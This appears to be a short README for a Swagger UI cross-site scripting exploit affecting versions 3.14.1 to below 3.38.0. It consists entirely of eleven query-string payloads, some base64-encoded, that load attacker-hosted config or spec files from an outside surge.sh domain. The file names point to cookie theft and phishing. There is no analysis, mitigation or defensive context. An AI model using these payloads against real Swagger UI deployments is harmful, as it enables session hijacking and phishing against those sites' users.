# swagger-ui-xss
Swagger UI version affected: `>=3.14.1` &lt; `3.38.0`

## Payload

1. `?configUrl=https://important-vein.surge.sh/simple.json`
2. `?configUrl=https://important-vein.surge.sh/test.json`
3. `?configUrl=https://important-vein.surge.sh/phising.json`
4. `?url=https://important-vein.surge.sh/cookie.yaml`
5. `?url=https://important-vein.surge.sh/domain.yaml`
6. `?url=https://important-vein.surge.sh/test.yaml`
7. `?url=https://important-vein.surge.sh/phising.yaml`
8. `?configUrl=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vaW1wb3J0YW50LXZlaW4uc3VyZ2Uuc2gvY29va2llLnlhbWwiLAp9`
9. `?configUrl=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vaW1wb3J0YW50LXZlaW4uc3VyZ2Uuc2gvZG9tYWluLnlhbWwiLAp9`
10. `?configUrl=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vaW1wb3J0YW50LXZlaW4uc3VyZ2Uuc2gvdGVzdC55YW1sIiwKfQ==`
11. `?configUrl=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vaW1wb3J0YW50LXZlaW4uc3VyZ2Uuc2gvcGhpc2luZy55YW1sIiwKfQ==`
